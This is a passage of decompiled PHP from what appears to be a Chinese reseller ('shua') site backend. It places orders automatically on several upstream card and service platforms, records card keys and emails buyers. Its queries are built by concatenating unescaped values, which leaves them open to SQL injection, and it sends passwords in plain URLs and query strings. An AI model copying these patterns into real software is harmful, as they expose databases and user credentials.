	$_var_8 = "Api_UserName=" . urlencode($_arg_0["username"]) . "&Api_UserMd5Pass=" . md5($_arg_0["password"]) . "&goods_id=" . $_arg_1 . "&goods_type=" . $_arg_2 . "&need_num_0=" . $_arg_3 . ($_arg_4 == 1 || $_arg_0["paytype"] == 1 ? "&pay_type=1" : NULL);
	if (is_array($_arg_5) && $_arg_5) {
		foreach ($_arg_5 as $_var_9 => $_var_10) {
			$_var_8 = $_var_8 . ("&" . $_var_9 . "=" . urlencode($_var_10));
		}
	}
	$_arg_5 = jiuwu_get_curl($_var_7, $_var_8);
	$_var_11 = json_decode($_arg_5, true);
	if (isset($_var_11["order_id"])) {
		$_var_6 = array("code" => 0, "message" => "success", "id" => $_var_11["order_id"]);
	} else {
		if (isset($_var_11["info"])) {
			$_var_6["message"] = $_var_11["info"];
		} else {
			if (preg_match("/<p\\sclass=\"error\">(.*?)<\\/p>/", $_arg_5, $_var_12)) {
				$_var_6["message"] = $_var_12[1];
			} else {
				$_var_6["message"] = $_arg_5;
			}
		}
	}
	return $_var_6;
}
function do_goods_jiuliu($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = "http://userapi2.dk2002.com:808/index.php?m=Api&c=User&a=Addorder";
	$_var_6 = "card=" . $_arg_0["username"] . "&pass=" . $_arg_0["password"] . "&goodsid=" . $_arg_1 . "&neednum=" . $_arg_2;
	if (is_array($_arg_3) && $_arg_3) {
		foreach ($_arg_3 as $_var_7 => $_var_8) {
			$_var_6 = $_var_6 . ("&" . $_var_7 . "=" . urlencode($_var_8));
		}
	}
	$_arg_3 = get_curl($_var_5, $_var_6);
	$_var_9 = json_decode(substr($_arg_3, 3), true);
	if (isset($_var_9["info"]) && strpos($_var_9["info"], "成功")) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_9["orderid"]);
	} else {
		if (isset($_var_9["info"])) {
			$_var_4["message"] = $_var_9["info"];
		} else {
			if (preg_match("/<p\\sclass=\"error\">(.*?)<\\/p>/", $_arg_3, $_var_10)) {
				$_var_4["message"] = $_var_10[1];
			} else {
				$_var_4["message"] = $_arg_3;
			}
		}
	}
	return $_var_4;
}
function do_goods_yile($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = "http://" . $_arg_0["url"] . ".api.94sq.cn/api/order";
	$_var_6 = array("api_token" => $_arg_0["username"], "timestamp" => time(), "gid" => $_arg_1, "num" => $_arg_2);
	if (is_array($_arg_3) && $_arg_3) {
		$_var_7 = 1;
		foreach ($_arg_3 as $_var_8) {
			$_var_6["value" . $_var_7] = $_var_8;
			$_var_7 = $_var_7 + 1;
		}
	}
	$_var_9 = yile_getSign($_var_6, $_arg_0["password"]);
	$_var_6["sign"] = $_var_9;
	$_var_10 = http_build_query($_var_6);
	$_arg_3 = get_curl($_var_5, $_var_10);
	$_var_11 = json_decode($_arg_3, true);
	if (array_key_exists("status", $_var_11) && $_var_11["status"] == 0) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_11["id"]);
		if (strpos($_var_11["message"], "购买卡密") !== false) {
			$_var_4["faka"] = true;
			$_var_4["kmdata"] = $_var_11["data"];
		}
	} else {
		if (array_key_exists("status", $_var_11)) {
			$_var_4["message"] = $_var_11["message"];
		} else {
			$_var_4["message"] = $_arg_3;
		}
	}
	return $_var_4;
}
function do_goods_xmsq($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = 0, $_arg_4 = array())
{
	$_var_5["code"] = -1;
	$_var_6 = "http://" . $_arg_0["url"] . "/Login/UserLogin.html";
	$_var_7 = "id=" . $_arg_1 . "&user=" . urlencode($_arg_0["username"]) . "&pwd=" . urlencode($_arg_0["password"]);
	$_var_8 = shequ_get_curl($_var_6, $_var_7, $_var_6, 0, 1);
	$_var_9 = "{" . getSubstr($_var_8, "{", "}") . "}";
	$_var_10 = json_decode($_var_9, true);
	if ($_var_10["status"] == 1) {
		$_var_11 = '';
		preg_match_all("/Set-Cookie: (.*);/iU", $_var_8, $_var_12);
		foreach ($_var_12[1] as $_var_13) {
			$_var_11 = $_var_11 . ($_var_13 . "; ");
		}
		if ($_arg_0["paytype"] == 1) {
			$_arg_3 = 1;
		}
		$_var_6 = "http://" . $_arg_0["url"] . "/Order/GoodsBuy.html";
		$_var_7 = "goodsid=" . $_arg_1 . "&num=" . $_arg_2 . "&pay_type=" . $_arg_3;
		if (is_array($_arg_4) && $_arg_4) {
			$_var_14 = 1;
			foreach ($_arg_4 as $_var_13) {
				if ($_var_13) {
					$_var_7 = $_var_7 . ("&neirong" . $_var_14 . "=" . urlencode($_var_13));
					$_var_14 = $_var_14 + 1;
				}
			}
		}
		$_arg_4 = shequ_get_curl($_var_6, $_var_7, "http://" . $_arg_0["url"] . "/form.html", $_var_11);
		$_var_10 = json_decode(substr($_arg_4, 3), true);
		if (isset($_var_10["orderid"])) {
			$_var_5 = array("code" => 0, "message" => "success", "id" => $_var_10["orderid"]);
		} else {
			if (array_key_exists("content", $_var_10)) {
				$_var_5["message"] = $_var_10["content"];
			} else {
				$_var_5["message"] = $_arg_4;
			}
		}
	} else {
		$_var_5["message"] = $_var_10["content"];
	}
	return $_var_5;
}
function do_goods_qqbug($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = "http://sdk.qqbug.net/X.aspx";
	$_var_6 = $_arg_3[0] . "    " . $_arg_2;
	$_var_7 = "action=Add&CardNo=" . $_arg_0["password"] . "&OrderInfo=" . urlencode($_var_6) . "&AppId=10001&PType=" . $_arg_1;
	$_arg_3 = get_curl($_var_5, $_var_7);
	$_var_8 = json_decode(str_replace("\"result\":,", "\"result\":0,", $_arg_3), true);
	if (isset($_var_8["result"]) && $_var_8["result"] > 0) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_8["result"]);
	} else {
		if (isset($_var_8["msg"])) {
			$_var_4["message"] = $_var_8["msg"];
		} else {
			$_var_4["message"] = $_arg_3;
		}
	}
	return $_var_4;
}
function do_goods_jumeng($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = "http://" . $_arg_0["url"] . "/Order/ApiOrderAdd.html";
	$_var_6 = "api_user=" . urlencode($_arg_0["username"]) . "&api_pwd=" . urlencode($_arg_0["password"]) . "&goodsid=" . $_arg_1 . "&num=" . $_arg_2 . "&pay_type=" . $_arg_0["paytype"];
	if (is_array($_arg_3) && $_arg_3) {
		$_var_7 = 1;
		foreach ($_arg_3 as $_var_8) {
			if ($_var_8) {
				$_var_6 = $_var_6 . ("&neirong" . $_var_7 . "=" . urlencode($_var_8));
				$_var_7 = $_var_7 + 1;
			}
		}
	}
	$_arg_3 = get_curl($_var_5, $_var_6);
	$_var_9 = json_decode($_arg_3, true);
	if (isset($_var_9["orderid"])) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_9["orderid"]);
	} else {
		if (array_key_exists("status", $_var_9)) {
			$_var_4["message"] = $_var_9["content"];
		} else {
			$_var_4["message"] = $_arg_3;
		}
	}
	return $_var_4;
}
function do_goods_this($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = "http://" . $_arg_0["url"] . "/api.php?act=pay";
	$_var_6 = array();
	$_var_6["tid"] = $_arg_1;
	$_var_6["user"] = $_arg_0["username"];
	$_var_6["pass"] = $_arg_0["password"];
	$_var_6["num"] = $_arg_2;
	if (is_array($_arg_3) && $_arg_3) {
		$_var_7 = 1;
		foreach ($_arg_3 as $_var_8) {
			if ($_var_8) {
				$_var_6["input" . $_var_7] = $_var_8;
				$_var_7 = $_var_7 + 1;
			}
		}
	}
	$_var_9 = http_build_query($_var_6);
	$_arg_3 = get_curl($_var_5, $_var_9);
	$_var_10 = json_decode($_arg_3, true);
	if (isset($_var_10["orderid"])) {
		$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_10["orderid"]);
	} else {
		if (array_key_exists("code", $_var_10)) {
			$_var_4["message"] = $_var_10["message"];
		} else {
			$_var_4["message"] = $_arg_3;
		}
	}
	return $_var_4;
}
function login_kayixin($_arg_0)
{
	$_var_1 = "http://" . $_arg_0["url"] . "/frontLogin.htm";
	$_var_2 = "loginTimes=1&userName=" . urlencode($_arg_0["username"]) . "&password=" . urlencode($_arg_0["password"]);
	$_var_3 = shequ_get_curl($_var_1, $_var_2, $_var_1, 0, 1);
	$_var_4 = "{" . getSubstr($_var_3, "{", "}") . "}";
	$_var_5 = json_decode($_var_4, true);
	if ($_var_5["code"] == 10000) {
		$_var_6 = '';
		preg_match_all("/Set-Cookie: (.*);/iU", $_var_3, $_var_7);
		foreach ($_var_7[1] as $_var_8) {
			$_var_6 = $_var_6 . ($_var_8 . "; ");
		}
		return $_var_6;
	}
	return "登录失败：" . $_var_5["mess"];
}
function do_goods_kayixin($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array(), $_arg_4 = array())
{
	$_var_5["code"] = -1;
	$_var_6 = getSubstr($_arg_1, "goodId=", "&");
	$_var_5["goodsid"] = $_var_6;
	$_var_7 = explode(",", $_arg_1);
	$_var_7 = $_var_7[2];
	$_var_7 = explode("&", $_var_7);
	$_var_7 = $_var_7[0] ? $_var_7[0] : "0";
	$_var_8 = ROOT . "other/" . md5($_arg_0["url"] . $_arg_0["username"]) . ".txt";
	$_var_9 = "http://" . $_arg_0["url"] . "/front/inter/uploadOrder.htm?salePwd=" . urlencode($_arg_0["paypwd"]);
	$_var_10 = "goodsId=" . $_var_6 . "&mainKey=" . $_var_7 . "&sumprice=" . $_arg_2 . "&textAccountName=" . urlencode($_arg_3[0]) . "&reltextAccountName=" . urlencode($_arg_3[0]);
	if (is_array($_arg_4) && $_arg_4[0]) {
		$_var_11 = 0;
		foreach ($_arg_4 as $_var_12) {
			$_var_10 = $_var_10 . ("&temptypeName" . $_var_11 . "=" . urlencode($_var_12) . "&lblName" . $_var_11 . "=" . urlencode($_arg_3[$_var_11 + 1]));
			$_var_11 = $_var_11 + 1;
		}
	}
	$_var_13 = file_get_contents($_var_8);
	if (!file_exists($_var_8) || !($_var_13 = file_get_contents($_var_8))) {
		$_var_13 = login_kayixin($_arg_0);
		if (strpos($_var_13, "失败")) {
			$_var_5["message"] = $_var_13;
			return $_var_5;
		}
		file_put_contents($_var_8, $_var_13);
	}
	$_arg_3 = shequ_get_curl($_var_9, $_var_10, "http://" . $_arg_0["url"] . "/front/inter/buyGoods.htm", $_var_13);
	if (strstr($_arg_3, "须重新登录系统")) {
		$_var_13 = login_kayixin($_arg_0);
		if (strpos($_var_13, "失败")) {
			$_var_5["message"] = $_var_13;
			return $_var_5;
		}
		file_put_contents($_var_8, $_var_13);
		$_arg_3 = shequ_get_curl($_var_9, $_var_10, "http://" . $_arg_0["url"] . "/front/inter/buyGoods.htm", $_var_13);
	}
	$_var_14 = json_decode($_arg_3, true);
	if (is_array($_var_14) && array_key_exists("orderNo", $_var_14)) {
		$_var_5 = array("code" => 0, "message" => "success", "id" => $_var_14["orderNo"]);
	} else {
		if (array_key_exists("mess", $_var_14)) {
			$_var_5["message"] = $_var_14["mess"];
		} else {
			$_var_5["message"] = $_arg_3;
		}
	}
	return $_var_5;
}
function do_goods_kalegou($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array())
{
	$_var_4["code"] = -1;
	$_var_5 = $_arg_0["password"];
	$_var_6 = '';
	$_var_7 = 0;
	while ($_var_7 < strlen($_var_5)) {
		$_var_6 = $_var_6 . (ord(substr($_var_5, $_var_7, 1)) . ",");
		$_var_7 = $_var_7 + 1;
	}
	$_var_8 = "http://" . $_arg_0["url"] . "/webnew/Customer/CustomerProcess/CheckCustomerLogin.aspx?UserName=" . urlencode($_arg_0["username"]) . "&pwd=" . $_var_6 . "&CheckCode=&DynamicCode=&FengYunlingCode=&EmailCode=&IsSafe=0&rki=undefined&rk=undefined&pwd1=" . $_var_6 . "&_=" . time() . "000";
	$_var_9 = get_curl($_var_8, 0, "http://" . $_arg_0["url"] . "/", 0, 1);
	$_var_10 = strstr($_var_9, "{");
	$_var_11 = json_decode($_var_10, true);
	if ($_var_11["Status"]["Code"] == "success") {
		$_var_12 = '';
		preg_match_all("/Set-Cookie: (.*);/iU", $_var_9, $_var_13);
		foreach ($_var_13[1] as $_var_14) {
			$_var_12 = $_var_12 . ($_var_14 . "; ");
		}
		preg_match("/PID=(\\d+)&TPID=(\\d+)&StockID=(.*)&/i", $_arg_1, $_var_15);
		$_var_16 = $_var_15[1];
		$_var_4["goodsid"] = $_var_16;
		$_var_17 = $_var_15[2];
		$_var_18 = $_var_15[3];
		$_var_8 = "http://" . $_arg_0["url"] . "/Templates/CustomTemplate.aspx?PID=" . $_var_16 . "&TPID=" . $_var_17 . "&StockID=" . $_var_18;
		$_var_9 = get_curl($_var_8, 0, 0, $_var_12);
		preg_match("!id=\"__VIEWSTATE\" value=\"(.*?)\"!i", $_var_9, $_var_19);
		preg_match("!id=\"__VIEWSTATEGENERATOR\" value=\"(.*?)\"!i", $_var_9, $_var_20);
		preg_match("!id=\"HFOrderNo\" value=\"(.*?)\"!i", $_var_9, $_var_21);
		preg_match("!id=\"HFGameCompanyID\" value=\"(.*?)\"!i", $_var_9, $_var_22);
		preg_match("!id=\"HFParvalue\" value=\"(.*?)\"!i", $_var_9, $_var_23);
		preg_match("!id=\"HFSupOrderNo\" value=\"(.*?)\"!i", $_var_9, $_var_24);
		if ($_arg_3[1]) {
			$_var_25 = "&txtChargeWay=" . urlencode($_arg_3[1]);
		}
		$_var_26 = "ScriptManager1=UpdatePanel2|ImageButtonBuyCheck&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=" . urlencode($_var_19[1]) . "&__VIEWSTATEGENERATOR=" . $_var_20[1] . "&HFProductID=" . $_var_16 . "&HFOrderNo=" . $_var_21[1] . "&HFGameCompanyID=" . $_var_22[1] . "&HFTemplateID=" . $_var_17 . "&HFParvalue=" . $_var_23[1] . "&HFSupOrderNo=" . $_var_24[1] . "&txtAccountName=" . urlencode($_arg_3[0]) . "&txtAccountName1=" . urlencode($_arg_3[0]) . $_var_25 . "&DrCount=" . $_arg_2 . "&txtComment=" . ($_arg_0["paypwd"] ? "&txtTradePassword=" . $_arg_0["paypwd"] : NULL) . "&ImageButtonBuyCheck=%E7%A1%AE%E8%AE%A4%E8%B4%AD%E4%B9%B0";
		$_arg_3 = get_curl($_var_8, $_var_26, $_var_8, $_var_12);
		if (preg_match("/HandTemplateDetail/", $_arg_3)) {
			$_var_4 = array("code" => 0, "message" => "success", "id" => $_var_21[1]);
		} else {
			if (preg_match("/alert\\((.*?)\\)/", $_arg_3, $_var_27)) {
				$_var_4["message"] = $_var_27[1];
			} else {
				$_var_4["message"] = $_arg_3;
			}
		}
	} else {
		$_var_4["message"] = $_var_11["Status"]["Msg"];
	}
	return $_var_4;
}
function do_goods_kahuika($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array(), $_arg_4 = array())
{
	$_var_5["code"] = -1;
	$_var_6 = "USER_NAME=" . urlencode($_arg_0["username"]) . "; USER_PWD=" . md5($_arg_0["password"]) . ";";
	$_var_7 = explode("productid=", $_arg_1);
	$_var_7 = $_var_7[1];
	$_var_7 = explode("&", $_var_7);
	$_var_7 = $_var_7[0];
	$_var_5["goodsid"] = $_var_7;
	$_var_8 = "http://" . $_arg_0["url"] . "/Product/Purchase?salePwd=" . urlencode($_arg_0["paypwd"]);
	$_var_9 = "ProductID=" . $_var_7 . "&Account=" . urlencode($_arg_3[0]) . "&relAccount=" . urlencode($_arg_3[0]) . "&Quantity=" . $_arg_2;
	if (is_array($_arg_4) && $_arg_4[0]) {
		$_var_10 = 1;
		foreach ($_arg_4 as $_var_11) {
			$_var_9 = $_var_9 . ("&CustomValue" . $_var_10 . "=" . urlencode($_var_11) . "&CustomContent" . $_var_10 . "=" . urlencode($_arg_3[$_var_10]));
			$_var_10 = $_var_10 + 1;
		}
	}
	$_arg_3 = shequ_get_curl($_var_8, $_var_9, "http://" . $_arg_0["url"] . "/Product/BuyProduct", $_var_6);
	$_var_12 = json_decode($_arg_3, true);
	if (is_array($_var_12) && array_key_exists("OrderCode", $_var_12)) {
		$_var_5 = array("code" => 0, "message" => "success", "id" => $_var_12["OrderCode"]);
	} else {
		if (array_key_exists("msg", $_var_12)) {
			$_var_5["message"] = $_var_12["msg"];
		} else {
			$_var_5["message"] = $_arg_3;
		}
	}
	return $_var_5;
}
function do_goods_kashangwl($_arg_0, $_arg_1, $_arg_2 = 1, $_arg_3 = array(), $_arg_4 = array())
{
	$_var_5["code"] = -1;
	$_var_6 = explode("BuyProduct/", $_arg_1);
	$_var_6 = $_var_6[1];
	$_var_6 = explode("?", $_var_6);
	$_var_6 = $_var_6[0];
	$_var_5["goodsid"] = $_var_6;
	$_var_7 = date("YmdHis") . rand(111, 999);
	$_var_8 = "http://www.kashangwl.com/api/BuyProduct";
	$_var_9 = "SerialNumber=" . $_var_7 . "&CustomerID=" . $_arg_0["username"] . "&ProductID=" . $_var_6 . "&TargetAccount=" . urlencode($_arg_3[0]) . "&BuyAmount=" . $_arg_2;
	if (is_array($_arg_4) && $_arg_4[0]) {
		$_var_10 = 1;
		$_var_11 = '';
		foreach ($_arg_4 as $_var_12) {
			$_var_11 = $_var_11 . ($_var_12 . "=" . $_arg_3[$_var_10] . ";");
			$_var_10 = $_var_10 + 1;
		}
		$_var_11 = substr($_var_11, 0, -1);
		$_var_9 = $_var_9 . ("&ManualOrderInfo=" . urlencode($_var_11));
	}
	$_var_13 = md5($_var_7 . $_arg_0["username"] . $_var_6 . $_arg_3[0] . $_arg_2 . $_arg_0["password"]);
	$_var_9 = $_var_9 . ("&Sign=" . $_var_13);
	$_arg_3 = get_curl($_var_8, $_var_9);
	$_var_14 = json_decode($_arg_3, true);
	if (is_array($_var_14) && array_key_exists("Success", $_var_14) && $_var_14["Success"] == true) {
		$_var_5 = array("code" => 0, "message" => "success", "id" => $_var_14["OrderID"]);
	} else {
		if (array_key_exists("Info", $_var_14)) {
			$_var_5["message"] = $_var_14["Info"];
		} else {
			$_var_5["message"] = $_arg_3;
		}
	}
	return $_var_5;
}
function do_goods_extend($_arg_0, $_arg_1, $_arg_2 = 0, $_arg_3 = NULL, $_arg_4 = 1, $_arg_5 = array(), $_arg_6 = array())
{
	if (class_exists("ExtendAPI")) {
		return ExtendAPI::do_goods($_arg_0, $_arg_1, $_arg_2, $_arg_3, $_arg_4, $_arg_5, $_arg_6);
	}
	return false;
}
function do_goods($_arg_0, $_arg_1, $_arg_2)
{
	global $DB;
	global $date;
	global $conf;
	if (!empty($_arg_1)) {
		return get_curl($_arg_1, $_arg_2);
	}
	$_var_6 = $DB->get_row("select * from shua_orders where id='" . $_arg_0 . "' limit 1");
	$_var_7 = $DB->get_row("select * from shua_tools where tid='" . $_var_6["tid"] . "' limit 1");
	$_var_8 = 0;
	$_var_9 = array($_var_6["input"], $_var_6["input2"], $_var_6["input3"], $_var_6["input4"], $_var_6["input5"]);
	$_var_10 = $_var_7["value"] * $_var_6["value"];
	if ($_var_10 <= 0) {
		$_var_10 = 1;
	}
	if ($_var_7["is_curl"] == 1) {
		do_curl($_var_7["curl"], $_var_9, $_var_10, $_var_7["name"], $_var_7["money"], $_arg_0, $_var_7["goods_param"]);
		$_var_8 = "访问指定URL成功";
	} else {
		if ($_var_7["is_curl"] == 2) {
			$_var_11 = explode("|", $_var_7["goods_param"]);
			$_var_12 = 0;
			foreach ($_var_9 as $_var_13) {
				if ($_var_13 != '') {
					$_var_14[$_var_11[$_var_12]] = $_var_13;
					$_var_12 = $_var_12 + 1;
				}
			}
			$_var_15 = $DB->get_row("select * from shua_shequ where id='" . $_var_7["shequ"] . "' limit 1");
			if ($_var_15 && $_var_15["username"] && $_var_15["password"]) {
				if ($_var_15["type"] == 1) {
					$_var_16 = do_goods_yile($_var_15, $_var_7["goods_id"], $_var_10, $_var_9);
					$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
					if ($_var_16["faka"] == true) {
						$_var_18 = '';
						foreach ($_var_16["kmdata"] as $_var_19) {
							$DB->query("INSERT INTO `shua_faka` (`tid`,`km`,`pw`,`orderid`,`addtime`,`usetime`) VALUES ('" . $_var_6["tid"] . "','" . $_var_19["card"] . "','" . $_var_19["pass"] . "','" . $_arg_0 . "',NOW(),NOW())");
							if (!empty($_var_19["pass"])) {
								$_var_18 = $_var_18 . ("卡号：" . $_var_19["card"] . " 密码：" . $_var_19["pass"] . "<br/>");
							} else {
								$_var_18 = $_var_18 . ($_var_19["card"] . "<br/>");
							}
						}
						$DB->query("update `shua_orders` set `status`='1',`djzt`='3',`djorder`='" . $_var_16["id"] . "' where `id`='" . $_arg_0 . "'");
						if (!empty($_var_18)) {
							if (is_numeric($_var_9[0]) && strlen($_var_9[0]) <= 10) {
								$_var_20 = $_var_9[0] . "@qq.com";
							} else {
								if (strpos($_var_9[0], "@")) {
									$_var_20 = $_var_9[0];
								}
							}
							if (checkEmail($_var_20)) {
								$_var_21 = $conf["sitename"] . " 卡密购买提醒";
								$_var_22 = $conf["faka_mail"];
								$_var_22 = str_replace("[kmdata]", $_var_18, $_var_22);
								$_var_22 = str_replace("[alert]", $_var_7["alert"], $_var_22);
								$_var_22 = str_replace("[name]", $_var_7["name"], $_var_22);
								$_var_22 = str_replace("[date]", $date, $_var_22);
								$_var_22 = str_replace("[email]", $_var_20, $_var_22);
								$_var_22 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_22);
								$_var_22 = str_replace("[sitename]", $conf["sitename"], $_var_22);
								send_mail($_var_20, $_var_21, $_var_22);
							}
						}
					}
				} else {
					if ($_var_15["type"] == 2) {
						$_var_16 = do_goods_jiuwu($_var_15, $_var_7["goods_id"], $_var_7["goods_type"], $_var_10, 1, $_var_14);
						$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " goods_type:" . $_var_7["goods_type"] . " num:" . $_var_10 . " data:" . http_build_query($_var_14);
					} else {
						if ($_var_15["type"] == 3) {
							$_var_16 = do_goods_xmsq($_var_15, $_var_7["goods_id"], $_var_10, 0, $_var_9);
							$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
						} else {
							if ($_var_15["type"] == 4) {
								$_var_16 = do_goods_jiuliu($_var_15, $_var_7["goods_id"], $_var_10, $_var_14);
								$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_14);
							} else {
								if ($_var_15["type"] == 5) {
									$_var_16 = do_goods_xmsq($_var_15, $_var_7["goods_id"], $_var_10, 1, $_var_9);
									$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
								} else {
									if ($_var_15["type"] == 6) {
										$_var_23 = explode("|", $_var_7["inputs"]);
										$_var_16 = do_goods_kayixin($_var_15, $_var_7["goods_param"], $_var_6["value"], $_var_9, $_var_23);
										$_var_17 = "kameng:" . $_var_7["shequ"] . " goodsId:" . $_var_16["goodsid"] . " data:" . http_build_query($_var_9);
									} else {
										if ($_var_15["type"] == 7) {
											$_var_16 = do_goods_kalegou($_var_15, $_var_7["goods_param"], $_var_6["value"], $_var_9);
											$_var_17 = "kameng:" . $_var_7["shequ"] . " goodsId:" . $_var_16["goodsid"] . " data:" . http_build_query($_var_9);
										} else {
											if ($_var_15["type"] == 8) {
												$_var_23 = explode("|", $_var_7["inputs"]);
												$_var_16 = do_goods_kahuika($_var_15, $_var_7["goods_param"], $_var_6["value"], $_var_9, $_var_23);
												$_var_17 = "kameng:" . $_var_7["shequ"] . " goodsId:" . $_var_16["goodsid"] . " data:" . http_build_query($_var_9);
											} else {
												if ($_var_15["type"] == 9) {
													$_var_23 = explode("|", $_var_7["inputs"]);
													$_var_16 = do_goods_kashangwl($_var_15, $_var_7["goods_param"], $_var_6["value"], $_var_9, $_var_23);
													$_var_17 = "kameng:" . $_var_7["shequ"] . " goodsId:" . $_var_16["goodsid"] . " data:" . http_build_query($_var_9);
												} else {
													if ($_var_15["type"] == 10) {
														$_var_16 = do_goods_qqbug($_var_15, $_var_7["goods_id"], $_var_10, $_var_9);
														$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
													} else {
														if ($_var_15["type"] == 11) {
															$_var_16 = do_goods_jumeng($_var_15, $_var_7["goods_id"], $_var_10, $_var_9);
															$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
														} else {
															if ($_var_15["type"] == 12) {
																$_var_16 = do_goods_this($_var_15, $_var_7["goods_id"], $_var_10, $_var_9);
																$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_9);
															} else {
																if ($_var_15["type"] == 20) {
																	$_var_16 = do_goods_extend($_var_15, $_var_7["goods_id"], $_var_7["goods_type"], $_var_7["goods_param"], $_var_10, $_var_9, $_var_14);
																	$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " num:" . $_var_10 . " data:" . http_build_query($_var_14);
																} else {
																	if ($_var_15["type"] == 0) {
																		$_var_16 = do_goods_jiuwu($_var_15, $_var_7["goods_id"], $_var_7["goods_type"], $_var_10, 0, $_var_14);
																		$_var_17 = "shequ:" . $_var_7["shequ"] . " goods_id:" . $_var_7["goods_id"] . " goods_type:" . $_var_7["goods_type"] . " num:" . $_var_10 . " data:" . http_build_query($_var_14);
																	}
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				if ($_var_16["code"] == 0) {
					$_var_8 = $conf["shequ_status"] ? $conf["shequ_status"] : 1;
					if ($_var_8 > 0 && !$_var_16["faka"]) {
						$DB->query("update `shua_orders` set `status`='" . $_var_8 . "',`djzt`='1',`djorder`='" . $_var_16["id"] . "',result=NULL where `id`='" . $_arg_0 . "'");
					}
					$_var_24 = "下单成功!订单号:" . $_var_16["id"];
				} else {
					if (strlen($_var_24) < 50) {
						$_var_24 = "下单失败：" . $_var_16["message"];
					} else {
						$_var_24 = "下单失败，原因未知，请查看日志";
					}
				}
				log_result("社区对接", $_var_17, $_var_16, 0);
			} else {
				$_var_24 = "未配置好网站对接信息";
			}
		} else {
			if ($_var_7["is_curl"] == 4) {
				$_var_25 = $_var_6["value"];
				$_var_26 = $DB->query("SELECT * FROM shua_faka WHERE tid='" . $_var_6["tid"] . "' AND orderid=0 LIMIT " . $_var_25 . '');
				$_var_18 = '';
				if ($_var_24 = $DB->fetch($_var_26)) {
					if (!empty($_var_24["pw"])) {
						$_var_18 = $_var_18 . ("卡号：" . $_var_24["km"] . " 密码：" . $_var_24["pw"] . "<br/>");
					} else {
						$_var_18 = $_var_18 . ($_var_24["km"] . "<br/>");
					}
					$DB->query("update `shua_faka` set `orderid`='" . $_arg_0 . "',`usetime`='" . $date . "' where `kid`='" . $_var_24["kid"] . "'");
				}
				if (!empty($_var_18)) {
					$DB->query("update `shua_orders` set `status`='1',`djzt`='3' where `id`='" . $_arg_0 . "'");
					if (is_numeric($_var_9[0]) && strlen($_var_9[0]) <= 10) {
						$_var_20 = $_var_9[0] . "@qq.com";
					} else {
						if (strpos($_var_9[0], "@")) {
							$_var_20 = $_var_9[0];
						}
					}
					$_var_21 = $conf["sitename"] . " 卡密购买提醒";
					$_var_22 = $conf["faka_mail"];
					$_var_22 = str_replace("[kmdata]", $_var_18, $_var_22);
					$_var_22 = str_replace("[alert]", $_var_7["desc"], $_var_22);
					$_var_22 = str_replace("[name]", $_var_7["name"], $_var_22);
					$_var_22 = str_replace("[date]", $date, $_var_22);
					$_var_22 = str_replace("[email]", $_var_20, $_var_22);
					$_var_22 = str_replace("[domain]", $_SERVER["HTTP_HOST"], $_var_22);
					$_var_22 = str_replace("[sitename]", $conf["sitename"], $_var_22);
					if (checkEmail($_var_20)) {
						send_mail($_var_20, $_var_21, $_var_22);
					}
					$_var_24 = "发卡成功！";
				} else {
					$DB->query("update `shua_orders` set `status`='0',`djzt`='4' where `id`='" . $_arg_0 . "'");
					$_var_24 = "卡密库存不足，发卡失败！";
				}
			} else {
				$_var_24 = "该商品未配置自动下单到社区/卡盟";
			}
		}
	}
	$_var_24 = str_replace(array("\r\n", "\r", "\n"), '', $_var_24);
	$_var_24 = htmlspecialchars($_var_24);
	return $_var_24;
}
function addPointRecord($_arg_0, $_arg_1 = 0, $_arg_2 = "提成", $_arg_3 = NULL)
{
	global $DB;
	$_arg_2 = addslashes($_arg_2);
	$_arg_3 = addslashes($_arg_3);
	$DB->query("INSERT INTO `shua_points` (`zid`, `action`, `point`, `bz`, `addtime`) VALUES ('" . $_arg_0 . "', '" . $_arg_2 . "', '" . $_arg_1 . "', '" . $_arg_3 . "', NOW())");
}
function rollbackPoint($_arg_0)
{
	global $DB;
	$_var_2 = $DB->query("SELECT id,zid,point FROM shua_points WHERE orderid='" . $_arg_0 . "' AND action='提成' LIMIT 2");
	while ($_var_3 = $DB->fetch($_var_2)) {
		$DB->query("UPDATE shua_site SET rmb=rmb-" . $_var_3["point"] . " WHERE zid='" . $_var_3["zid"] . "'");
